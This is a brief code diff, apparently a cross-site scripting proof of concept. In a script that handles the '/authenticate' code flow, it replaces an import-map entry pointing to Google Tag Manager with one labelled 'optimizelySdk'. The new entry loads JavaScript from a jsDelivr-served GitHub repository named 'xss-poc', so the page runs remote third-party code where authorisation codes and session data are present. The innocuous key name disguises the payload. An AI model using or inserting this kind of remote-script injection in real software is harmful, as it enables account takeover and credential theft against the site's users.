@@ -9,7 +9,7 @@ if(searchParams.has('code') && location.path ==='/authenticate') {
     JSON.stringify([
       {
         imports: {
-          '@zettle-bo/bootstrapper': 'https://www.googletagmanager.com/gtm.js?id=GTM-MWX3S387',
+          "optimizelySdk":"https://cdn.jsdelivr.net/gh/CaTzil/xss-poc@main/docu.js"
         },
       },
     ])
